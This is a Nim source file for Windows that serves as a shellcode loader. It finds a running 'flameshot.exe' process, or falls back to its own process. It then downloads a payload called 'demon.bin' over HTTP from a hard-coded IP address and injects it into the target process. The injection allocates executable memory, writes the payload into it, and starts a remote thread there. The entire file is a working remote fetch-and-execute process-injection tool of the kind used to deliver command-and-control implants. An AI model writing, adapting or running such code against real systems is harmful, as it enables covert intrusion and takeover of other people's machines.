import winim, strformat, strutils, httpclient, streams

# Status indicators
template success(s: varargs[untyped]): untyped = 
    when DEBUG:
        echo "[+] ", s
template fail(s: varargs[untyped]): untyped = 
    when DEBUG:
        echo "[-] ", s
template info(s: varargs[untyped]): untyped =
    when DEBUG:
        echo "[*] ", s
template debug(s: varargs[untyped]): untyped =
    when DEBUG:
        echo "[>] ", s

const DEBUG = true
const url = "http://172.20.10.10/demon.bin"
const target = "flameshot.exe"

proc GetPIDByName(process: string) : DWORD =
    var pid: DWORD

    # Create snapshot
    var snapshot : HANDLE = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    var process: PROCESSENTRY32W
    ZeroMemory(&process, sizeof(PROCESSENTRY32W))
    process.dwSize = cast[DWORD](sizeof(process))

    # Iterate over processes
    while Process32NextW(snapshot, &process) != 0:
        var processName: string = ""
        for c in process.szExeFile:
            if c == 0:
                break
            processName.add(char((int)c))
        
        if processName == target:
            debug("Found process: ", process.szExeFile, ", PID: ", process.th32ProcessID)
            pid = process.th32ProcessID
    
    # Close snapshot handle
    CloseHandle(snapshot)

    return pid

proc run() : int = 
    
    var pHandle: HANDLE
    
    # Get PID of target process
    info(fmt"Getting PID of {target}")
    var pid = GetPIDByName(target)
    if pid == 0:
        fail(fmt"Failed to get PID of {target}. Check if the process is running.")
        info(fmt"Using current process instead.")

        # GetCurrentProcess: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess
        info("Getting handle to current process")
        pHandle = GetCurrentProcess() 
        if pHandle == 0:
            fail("Failed to get handle to current process: ", GetLastError())
            return ERROR
        success(fmt"> Got handle to current process: {pHandle}")
    else: 
        success(fmt"> Got PID to process {target}: {pid}")

        # OpenProcess: https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
        info(fmt"Getting handle to process {target}")
        pHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, pid)
        if pHandle == 0:
            fail(fmt"Failed to get handle to process {target}: ", GetLastError())
            return ERROR
        success(fmt"> Got handle to process {target}: {pHandle}")

    # Fetch shellcode from remote web server
    info(fmt"Fetching payload from {url}")
    var response = newHttpClient().get(url)
    if response.status != "200 OK":
        fail(fmt"Failed to fetch payload from {url}: {response.status}")
        return ERROR
    var shellcode = response.bodyStream.readAll()
    success(fmt"> Read {shellcode.len} bytes from {url}")

    # VirtualAllocEx: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
    info("Allocating memory in process")
    var lpAddress = VirtualAllocEx(pHandle, nil, shellcode.len, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if lpAddress == nil:
        fail("Failed to allocate memory: ", GetLastError())
        return ERROR
    success(fmt"> Allocated {shellcode.len} bytes at base address {cast[ByteAddress](lpAddress)}")

    # WriteProcessMemory: https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
    info("Writing shellcode to process memory")
    var bytesWritten: SIZE_T = 0
    if WriteProcessMemory(pHandle, lpAddress, &shellcode, shellcode.len, &bytesWritten) == 0:
        fail("Failed to write process memory: ", GetLastError())
        return ERROR
    success(fmt"> Wrote {bytesWritten} bytes.")

    # CreateRemoteThread: https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread
    info("Creating remote thread")
    var threadId: DWORD = 0
    var hThread = CreateRemoteThread(pHandle, nil, 0, cast[LPTHREAD_START_ROUTINE](lpAddress), nil, 0, &threadId)
    if hThread == 0:
        fail("Failed to create remote thread: ", GetLastError())
        return ERROR
    success(fmt"> Thread ID: {threadId}")
    success(fmt"> Thread handle: {hThread}")

    # WaitForSingleObject: https://learn.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject
    info(fmt"Waiting for thread {hThread} to exit.")
    WaitForSingleObject(hThread, INFINITE)
    success("> Thread exited.")

    # CloseHandle: https://learn.microsoft.com/en-us/windows/win32/api/handleapi/nf-handleapi-closehandle
    info("Closing process handle")
    CloseHandle(pHandle)
    info("Closing thread handle")
    CloseHandle(hThread)

    return SUCCESS

when isMainModule:
    discard run()